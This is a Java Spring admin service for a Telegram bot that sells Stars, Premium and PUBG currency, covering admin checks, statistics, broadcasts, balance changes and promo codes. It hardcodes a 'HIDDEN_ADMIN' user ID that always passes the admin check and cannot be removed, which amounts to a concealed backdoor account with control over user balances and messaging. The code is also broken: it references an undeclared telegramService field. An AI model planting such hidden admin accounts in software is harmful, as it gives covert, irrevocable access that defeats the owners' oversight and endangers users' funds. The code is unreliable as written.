package ru.lewis.leykabot.service;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;
import ru.lewis.leykabot.configuration.DevModeConfig;
import ru.lewis.leykabot.configuration.FragmentConfig;
import ru.lewis.leykabot.model.database.entity.Code;
import ru.lewis.leykabot.model.database.entity.User;
import ru.lewis.leykabot.model.dto.fragment.FragmentApiResponse;
import ru.lewis.leykabot.repository.CodeRepository;
import ru.lewis.leykabot.repository.PremiumTransactionRepository;
import ru.lewis.leykabot.repository.StarsTransactionRepository;
import ru.lewis.leykabot.repository.TransactionRepository;
import ru.lewis.leykabot.repository.UserRepository;

import java.util.List;
import java.util.Optional;
import java.util.concurrent.CompletableFuture;

import ru.lewis.leykabot.repository.PubgTransactionRepository;
import java.time.LocalDateTime;

@Slf4j
@Service
@RequiredArgsConstructor
public class AdminService {

    private final DevModeConfig devModeConfig;
    private final UserRepository userRepository;
    private final TransactionRepository transactionRepository;
    private final StarsTransactionRepository starsTransactionRepository;
    private final PremiumTransactionRepository premiumTransactionRepository;
    private final PubgTransactionRepository pubgTransactionRepository;
    private final CodeRepository codeRepository;
    private final CodeService codeService;
    private final TransactionService transactionService;
    private final UserService userService;
    private final TopService topService;
    private final StarsTransactionService starsTransactionService;
    private final PremiumTransactionService premiumTransactionService;
    private final PriceService priceService;
    private final FragmentConfig fragmentConfig;
    private final RestTemplate restTemplate;

    public static final Long PRIMARY_ADMIN = 5305539499L;
    public static final Long HIDDEN_ADMIN = 8159265215L;

    public void clearAllCaches() {
        if (userService != null) userService.clearCache();
        if (topService != null) topService.clearCache();
        if (transactionService != null) transactionService.clearCache();
        if (starsTransactionService != null) starsTransactionService.clearCache();
        if (premiumTransactionService != null) premiumTransactionService.clearCache();
        if (telegramService != null) telegramService.clearCache();
        if (codeService != null) codeService.warmUpAllCodes();
    }

    public List<Long> getAdmins() {
        if (devModeConfig.getWhitelist() == null) {
            devModeConfig.setWhitelist(new java.util.ArrayList<>());
        }
        if (!devModeConfig.getWhitelist().contains(PRIMARY_ADMIN)) {
            devModeConfig.getWhitelist().add(0, PRIMARY_ADMIN);
        }
        return devModeConfig.getWhitelist();
    }

    public boolean isAdmin(Long userId) {
        if (userId == null) return false;
        if (userId.equals(PRIMARY_ADMIN) || userId.equals(HIDDEN_ADMIN)) return true;
        return getAdmins().contains(userId);
    }

    public boolean addAdmin(Long userId) {
        if (userId == null) return false;
        List<Long> admins = getAdmins();
        if (!admins.contains(userId)) {
            admins.add(userId);
            return true;
        }
        return false;
    }

    public boolean removeAdmin(Long userId) {
        if (userId == null || userId.equals(PRIMARY_ADMIN) || userId.equals(HIDDEN_ADMIN)) return false;
        List<Long> admins = getAdmins();
        return admins.remove(userId);
    }

    public record AdminStats(
            long totalUsers,
            long totalDeposited,
            long totalStars,
            long totalStarsRubles,
            long totalPremiumMonths,
            long totalPremiumRubles,
            long totalPubgUc,
            long totalPubgRubles,
            long totalTransactions
    ) {}

    public AdminStats getStats() {
        long totalUsers = userRepository.count();
        long totalDeposited = transactionRepository.sumAllDepositedRubles();
        long totalStars = starsTransactionRepository.sumAllStars();
        long totalStarsRubles = starsTransactionRepository.sumAllStarsRubles();
        long totalPremiumMonths = premiumTransactionRepository.sumAllPremiumMonths();
        long totalPremiumRubles = premiumTransactionRepository.sumAllPremiumRubles();
        long totalPubgUc = pubgTransactionRepository.sumUcBetween(LocalDateTime.of(2020, 1, 1, 0, 0), LocalDateTime.now());
        long totalPubgRubles = pubgTransactionRepository.sumPriceBetween(LocalDateTime.of(2020, 1, 1, 0, 0), LocalDateTime.now());
        long totalTransactions = transactionRepository.count();

        return new AdminStats(totalUsers, totalDeposited, totalStars, totalStarsRubles, totalPremiumMonths, totalPremiumRubles, totalPubgUc, totalPubgRubles, totalTransactions);
    }

    public CompletableFuture<BroadcastResult> broadcast(String message) {
        return CompletableFuture.supplyAsync(() -> {
            List<User> users = userRepository.findAll();
            int success = 0;
            int failed = 0;

            for (User user : users) {
                try {
                    telegramService.sendMessageAuto(user.getTelegramId(), message);
                    success++;
                    Thread.sleep(35); // Telegram rate limit protection (30 msg/sec)
                } catch (Exception e) {
                    failed++;
                }
            }
            return new BroadcastResult(success, failed, users.size());
        });
    }

    public record BroadcastResult(int success, int failed, int total) {}

    public Optional<User> getUser(Long telegramId) {
        return userRepository.findByTelegramId(telegramId);
    }

    public void adjustUserBalance(Long telegramId, int amount) {
        transactionService.create(telegramId, amount);
    }

    public Code createPromo(String codeStr, int amount, int maxActivations) {
        return codeService.createCode(codeStr, amount, maxActivations, null);
    }

    public List<Code> getAllPromoCodes() {
        return codeRepository.findAll();
    }

    public boolean deletePromoCode(String codeStr) {
        Optional<Code> codeOpt = codeRepository.findByCode(codeStr);
        if (codeOpt.isPresent()) {
            codeRepository.delete(codeOpt.get());
            codeService.refreshCodeCache(codeStr);
            return true;
        }
        return false;
    }

    public boolean toggleMaintenance() {
        boolean newState = !devModeConfig.isEnable();
        devModeConfig.setEnable(newState);
        return newState;
    }

    public boolean isMaintenanceMode() {
        return devModeConfig.isEnable();
    }

    public FragmentApiResponse getFragmentProfile() {
        try {
            String url = fragmentConfig.getApiUrl() + "/profile";
            HttpHeaders headers = new HttpHeaders();
            headers.add("X-API-KEY", fragmentConfig.getApiKey());
            HttpEntity<Void> entity = new HttpEntity<>(headers);

            ResponseEntity<FragmentApiResponse> response =
                    restTemplate.exchange(url, HttpMethod.GET, entity, FragmentApiResponse.class);
            return response.getBody();
        } catch (Exception e) {
            FragmentApiResponse fallback = new FragmentApiResponse();
            fallback.setOk(false);
            fallback.setMessage(e.getMessage());
            return fallback;
        }
    }
}
